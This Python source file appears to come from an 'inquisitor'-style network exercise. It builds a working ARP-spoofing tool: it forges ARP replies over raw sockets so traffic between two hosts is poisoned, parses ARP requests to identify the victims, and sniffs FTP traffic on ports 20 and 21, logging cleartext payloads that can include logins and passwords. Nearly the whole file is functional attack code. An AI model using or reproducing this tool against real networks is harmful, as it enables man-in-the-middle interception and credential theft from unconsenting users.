from ainsi import *

#? ARP LISTENER
ETH_HLEN = 14
ARP_ETHERTYPE = 0x0806 #! ARP TYPE
ARP_REQUEST_OP = 1
ARP_REPLY_OP = 2

#? FTP LISTENER
IP_HLEN_MIN = 20
TCP_HLEN_MIN = 20
IP_PROTOCOL_TCP = 0x06

import pcapy
import struct
import socket

import threading
import time

threading_end_event = threading.Event()

def mac_to_bytes(mac_address):
    return bytes.fromhex(mac_address.replace(':', ''))

def send_arp_reply(interface, attacker_mac, impersonated_ip, target_mac, target_ip):
    try:    
        target_mac_bytes = mac_to_bytes(target_mac)
        attacker_mac_bytes = mac_to_bytes(attacker_mac)

        impersonated_ip_bytes = socket.inet_aton(impersonated_ip)
        target_ip_bytes = socket.inet_aton(target_ip)

        ethernet_header = struct.pack("!6s6sH", target_mac_bytes, attacker_mac_bytes, ARP_ETHERTYPE)

        arp_packet = struct.pack("!HHBBH6s4s6s4s", 1, 0x0800, 6, 4, ARP_REPLY_OP, attacker_mac_bytes, impersonated_ip_bytes, target_mac_bytes, target_ip_bytes)

        full_packet = ethernet_header + arp_packet

        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ARP_ETHERTYPE))
        s.bind((interface, 0))

        s.send(full_packet)
        s.close()

    except PermissionError:
        log_error("Permission denied. Sending raw packets requires root privileges.")
    except Exception as e:
        log_error(f"Error sending ARP reply: {e}")

def process_ftp_packet(header, packet_data):
    try:
        eth_type = struct.unpack("!H", packet_data[12:14])[0]

        if eth_type == 0x0800:
            ip_header_start = ETH_HLEN
            if len(packet_data) < ip_header_start + IP_HLEN_MIN:
                return
            ip_header_raw = packet_data[ip_header_start:ip_header_start + IP_HLEN_MIN]
            ip_header = struct.unpack("BBHHHBBH4s4s", ip_header_raw)

            version_ihl = ip_header[0]
            ihl = version_ihl & 0xF
            ip_header_length = ihl * 4

            if ip_header_length < IP_HLEN_MIN:
                return
            
            protocol = ip_header[6]
            src_ip = socket.inet_ntoa(ip_header[8])
            dst_ip = socket.inet_ntoa(ip_header[9])

            if protocol == IP_PROTOCOL_TCP:
                tcp_header_start = ip_header_start + ip_header_length
                if len(packet_data) < tcp_header_start + TCP_HLEN_MIN:
                    return
                
                tcp_header_raw = packet_data[tcp_header_start:tcp_header_start + TCP_HLEN_MIN]
                tcp_header = struct.unpack("!HHLLBBHHH", tcp_header_raw)

                src_port = tcp_header[0]
                dst_port = tcp_header[1]
                offset_reserved_flags = tcp_header[4]
                tcp_offset = ((offset_reserved_flags >> 4) & 0xf) * 4

                if tcp_offset < TCP_HLEN_MIN:
                    return
                
                payload_start = tcp_header_start + tcp_offset
                ftp_payload = b''
                
                if payload_start < len(packet_data):
                    ftp_payload = packet_data[payload_start:]
                    

                if src_port in [20, 21] or dst_port in [20, 21]:
                    try :
                        decoded_payload = ftp_payload.decode('ascii', errors='ignore').strip()
                        if decoded_payload:
                            log_info(f"FTP Traffic: {src_ip}:{src_port} -> {dst_ip}:{dst_port} | Payload: {decoded_payload}")
                    except UnicodeDecodeError:
                            log_debug(f"FTP Traffic: {src_ip}:{src_port} -> {dst_ip}:{dst_port} | Binary data (len={len(ftp_payload)})")
    except struct.error as e:
        log_debug(f"Packet parsing error (struct.error in _process_ftp_packet): {e}")
    except IndexError as e:
        log_debug(f"Index error (packet too short/malformed in _process_ftp_packet): {e}")
    except Exception as e:
        log_error(f"An unexpected error occurred in _process_ftp_packet: {e}")

def process_request_packet(header, data, inquisitor):
    sender_mac, sender_ip, target_mac, target_ip = None, None, None, None
    try:
        eth_type = struct.unpack("!H", data[12:14])[0]

        if eth_type == ARP_ETHERTYPE:
            arp_packet = data[ETH_HLEN:]

            operation = struct.unpack("!H", arp_packet[6:8])[0]

            if operation == ARP_REQUEST_OP:
                #! HERE WE GET ALL WE NEED TO KNOW (IP/MAC of SENDER + TARGET)
                sender_mac_bytes = arp_packet[8:14]
                sender_mac = ":".join(f"{b:02x}" for b in sender_mac_bytes)

                sender_ip_bytes = arp_packet[14:18]
                sender_ip = socket.inet_ntoa(sender_ip_bytes)

                target_mac_bytes = arp_packet[18:24]
                target_mac = ":".join(f"{b:02x}" for b in target_mac_bytes)

                target_ip_bytes = arp_packet[24:28]
                target_ip = socket.inet_ntoa(target_ip_bytes)

    except struct.error as e:
        log_error(f"Packet decoding error (struct.error): {e}")
    except IndexError as e:
        log_error(f"Index error (packet too short or malformed): {e}")
    except Exception as e:
        log_error(f"An unexpected error occurred while processing the packet: {e}")

    if sender_ip == inquisitor.source.ip_address and target_ip == inquisitor.target.ip_address:
        return sender_mac, sender_ip, target_mac, target_ip
    elif target_ip == inquisitor.source.ip_address and sender_ip == inquisitor.target.ip_address:
        return sender_mac, sender_ip, target_mac, target_ip
    else:
        return None, None, None, None
